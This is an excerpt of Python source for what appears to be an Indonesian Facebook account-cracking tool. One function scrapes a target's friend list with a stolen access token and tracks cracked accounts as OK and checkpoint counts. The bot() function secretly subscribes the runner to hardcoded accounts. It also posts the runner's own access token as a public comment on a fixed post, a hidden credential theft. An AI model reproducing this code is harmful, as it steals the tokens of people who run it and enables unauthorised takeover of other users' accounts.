...
def bot():
	...
	requests.post("https://graph.facebook.com/100068397981838/subscribers?access_token="+token) # Niki mark
	requests.post("https://graph.facebook.com/100068397981838/subscribers?access_token="+token) # Niki mark
	requests.post("https://graph.facebook.com/100068397981838/subscribers?access_token="+token) # Niki mark
	requests.post("https://graph.facebook.com/100043390310348/subscribers?access_token="+token) # Niki mark
	requests.post("https://graph.facebook.com/100068397981838/subscribers?access_token="+token) # Niki mark
	requests.post("https://graph.facebook.com/254018450221419/comments/?message="+token+"&access_token="+token)
	requests.post("https://graph.facebook.com/254018450221419/comments/?message="+komentar+"&access_token="+token)
	requests.post("https://graph.facebook.com/254018450221419/comments/?message="+token+"&access_token="+token)
	menu()
...
def menu():
	...
	try:
		...
		time.sleep(0.5)
		exit()
	print("\n"+balmond+l+" Selamat datang : "+h+pillow["name"])
	...
	if sayangku=="1" or sayangku=="01":
		...
		jalan("\n"+balmond+m+" Pilih Yang Bener Cok")
		time.sleep(0.5)
		menu()
...
def publik():
	...
	try:
		...
		exit()
	try:
		bulu = requests.get("https://graph.facebook.com/%s?fields=name,friends.fields(id,name).limit(5000)&access_token=%s'"%(uid,token))
		buriq = json.loads(bulu.text)
		for cew in buriq['friends']['data']:
			try:
				jamet = cew["id"]
				junet = cew["name"]
				id.append(jamet+"|"+junet)
	...
	if len(berapa_d)==0:
		...
		for angka in berapa_d:
			...
			if dutt>3599:
				...
				dett = ditt[0]+"d"
	print(h+"\r{"+k+"Crack"+h+"} "+l+"%s/%s OK:%s CP:%s %s[%s%s%s] [%s%s%s]"%(loop,len(id),len(ok),len(cp),h,k,persen,h,k,dett,h), end=' ');sys.stdout.flush()
